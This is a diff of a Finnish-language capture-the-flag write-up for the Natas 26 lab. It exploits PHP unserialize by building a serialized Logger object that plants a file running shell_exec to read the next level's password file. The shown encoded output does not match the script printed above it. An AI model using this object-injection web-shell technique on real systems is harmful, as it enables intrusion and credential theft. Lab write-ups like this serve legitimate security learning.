@@ -650,30 +650,209 @@ Kun tähän liitetään esimerkiksi PHP-koodi, joka hakee salasanan seuraavalle 
 
 password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 
+`curl -v http://natas26.natas.labs.overthewire.org/ --user natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`
+
+Pieni curl komento -v verbose osuus:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -v http://natas26.natas.labs.overthewire.org/ --user natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
+* Host natas26.natas.labs.overthewire.org:80 was resolved.
+* IPv6: (none)
+* IPv4: 13.48.176.69
+*   Trying 13.48.176.69:80...
+* Connected to natas26.natas.labs.overthewire.org (13.48.176.69) port 80
+* Server auth using Basic with user 'natas26'
+> GET / HTTP/1.1
+> Host: natas26.natas.labs.overthewire.org
+> Authorization: Basic bmF0YXMyNjpjVlhYd3hNUzNZMjZuNVVaVTg5UWdwR21XQ2VsYVFsRQ==
+> User-Agent: curl/8.7.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Tue, 29 Jul 2025 13:55:00 GMT
+< Server: Apache/2.4.58 (Ubuntu)
+< Set-Cookie: PHPSESSID=1dq5hsvfjea9bu00206vpssjof; path=/; HttpOnly
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Vary: Accept-Encoding
+< Content-Length: 1148
+< Content-Type: text/html; charset=UTF-8
+< 
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas26", "pass": "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" };</script></head>
+<body>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+* Connection #0 to host natas26.natas.labs.overthewire.org left intact
+```
 
 
 
+Kokeilin jotakin PHPSESSID:tä eli siinä kirjauttuneena istunnolla ja siitä kääntää **BASE64 enkoodausta**.
+
+PHPSESSION-VALUE.php, ja haluat base64-koodata sen sisällön, se onnistuu helposti Kali Linuxissa — tiedoston pääte .php ei estä mitään.
+
+pientä malli ja pikka lunttilappua:
+MALLI: `base64 PHPSESSION-VALUE.php` <br>
+tiedostoon: `base64 PHPSESSION-VALUE.php > encoded.txt`
+
+
+🔓 Base64-dekoodaa takaisin: <br>
+`base64 --decode encoded.txt > decoded.php`
+
+
+Jos haluat koodata vain tiedoston nimen (ei sisältöä), <br>
+Tämä antaa sinulle base64-version tiedostonimestä, ei sen sisällöstä:
+`echo -n "1dq5hsvfjea9bu00206vpssjof.php" | base64`
+
+**EVÄSTEEN TOIMINTAA** <br>
+Eli pientä evästeiden toimintaa että alettu suorittaa jotakin toimintoja:
+
+- PHPSESSID: g8hn7mhe42vm00c3cgqnbhqkgf <br>
+- drawing: YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0%3D <br>
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ echo -n "YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0%3D" | base64
+WVRveE9udHBPakE3WVRvME9udHpPakk2SW5neElqdHpPakk2SWpNeUlqdHpPakk2SW5reElqdHpP
+akk2SWpVM0lqdHpPakk2SW5neUlqdHpPakk2SWpnNUlqdHpPakk2SW5reUlqdHpPak02SWpFeU15
+STdmWDAlM0Q=
+                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ php -r 'echo print_r(unserialize(base64_decode("YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0=")), true);'
+Array
+(
+    [0] => Array
+        (
+            [x1] => 32
+            [y1] => 57
+            [x2] => 89
+            [y2] => 123
+        )
+
+)
+```
+
+![alt text](./kuvat-level22-28/natas26-6.png)
+
+
+**tämä muuttaa sen takaisin** - eli ei hyötyä kauhesti.. että wtf
+```
+┌──(kali㉿kali)-[~]
+└─$ php -r '$o = ["x1"=>"32", "y1"=>"57", "x2"=>"89", "y2"=>"123"]; print base64_encode(serialize($o))."\n";'
+YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fQ==
 
 
 
+curl http://natas26.natas.labs.overthewire.org/img/shell.php \
+  --user "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
+  --cookie "drawing=g8hn7mhe42vm00c3cgqnbhqkgf"
+```
+
+Tässä aloin suorittaa sitä curl komentoa, että perään normi basic authentication ja --cookie evässte mitä drawing keräättiin tuolta selaimen kautta ja päivitetty selain että tuoreemman version esim. Kali linux sisäisen **BURP suite** omalla selaimella eikä firefox kautta.
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://natas26.natas.labs.overthewire.org/ \             
+  --user "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
+  --cookie "drawing=g8hn7mhe42vm00c3cgqnbhqkgf"
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas26", "pass": "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" };</script></head>
+<body>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<br />
+<b>Notice</b>:  unserialize(): Error at offset 0 of 19 bytes in <b>/var/www/natas/natas26/index.php</b> on line <b>70</b><br />
+<img src="img/natas26_rs3osgd2663cmb9c518rmq2goq.png"><br />
+<b>Notice</b>:  unserialize(): Error at offset 0 of 19 bytes in <b>/var/www/natas/natas26/index.php</b> on line <b>98</b><br />
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 
 
+**PHP koodia vähäsen** käyttöön.
+```
+┌──(kali㉿kali)-[~/Desktop/php-koodi]
+└─$ cat logger1.php     
+<?php
+# this is for natas26 level
+class Logger{
+    private $logFile;
+    private $exitMsg;
+
+    function __construct(){
+        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "/var/www/natas/natas26/img/natas26_rs3osgd2663cmb9c518rmq2goq.php";
+    }
+}
+
+$logger = new Logger();
+echo base64_encode(serialize($logger));
 
 
 
+┌──(kali㉿kali)-[~/Desktop/php-koodi]
+└─$ php logger1.php      
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiaW1nL25hdGFzMjZfcnMzb3NnZDI2NjNjbWI5YzUxOHJtcTJnb3EucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTk6IkFueXRoaW5nIGdvZXMgaGVyZQoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MzoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9
+```  
+
+![alt text](./kuvat-level22-28/natas26-7.png)
 
 
+![alt text](./kuvat-level22-28/natas26-8.png)
 
 
-
-
-
-
-
-
-
-
+![alt text](./kuvat-level22-28/natas26-9.png)
 
 
 
